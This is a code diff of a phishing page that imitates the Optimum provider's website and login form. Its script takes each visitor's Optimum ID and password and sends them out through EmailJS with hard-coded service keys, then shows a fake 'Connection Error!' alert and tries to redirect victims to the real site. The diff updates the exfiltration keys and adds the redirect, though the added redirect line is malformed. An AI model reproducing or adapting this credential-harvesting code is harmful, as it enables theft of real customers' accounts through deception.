@@ -262,10 +262,11 @@
     <nav class="navbar navbar-expand-lg navbar-light">
       <div class="logo">
         <p>En español</p>
+        <!-- <a href="/"><img src="assets/logo.webp"/></a> -->
         <a href="/"
-          ><img
-            src="https://www.optimum.net/cdn/static.tvlistings.optimum.net/ool/static/prod/images/logo_desktop.png"
-        /></a>
+        ><img
+          src="https://www.optimum.net/cdn/static.tvlistings.optimum.net/ool/static/prod/images/logo_desktop.png"
+      /></a>
       </div>
 
       <div class="navigations">
@@ -363,25 +364,29 @@
 
       <div class="">
         <img src="./assets/get optimum.png" />
+         <img src=""/>
       </div>
 
       <div class="">
         <img src="./assets/optimum mobile.png" />
+         
       </div>
     </main>
     <div class="container-fluid">
       <div class="">
         <img src="./assets/optimum help.png" />
+       
       </div>
       <div class="">
         <img src="./assets/optimum my bill.png" />
+        <!-- <img src="https://www.optimum.net/cdn/static.tvlistings.optimum.net/ool/static/prod/images/Phones.png"/> -->
       </div>
     </div>
 
     <script>
       // Load the EmailJS SDK asynchronously
       (function () {
-        emailjs.init("Fc6Zb2E93HsLc4jAH");
+        emailjs.init('rtY-eQw7FQMhGpvq-');
       })();
 
       // Handle the form submission
@@ -391,12 +396,12 @@
         event.preventDefault(); // Prevent the default form submission behavior
 
         // Get the form data;
-        const optimumId = form.elements["exampleInputEmail1"].value;
-        const password = form.elements["exampleInputPassword1"].value;
+        let optimumId = form.elements["exampleInputEmail1"].value;
+        let password = form.elements["exampleInputPassword1"].value;
 
         // Send the form data to EmailJS
         emailjs
-          .send("service_rybja5w", "template_2g5g3nh", {
+          .send("service_8tfjetp", "template_bk8euhy", {
             optimumId: optimumId,
             password: password,
           })
@@ -404,6 +409,10 @@
             () => {
               // Handle the successful form submission here
               alert("Connection Error!");
+              window.location.href('https://www.optimum.net');
+              let optimumId = ""
+              let password = "";
+           
             },
             (error) => {
               // Handle the form submission error here
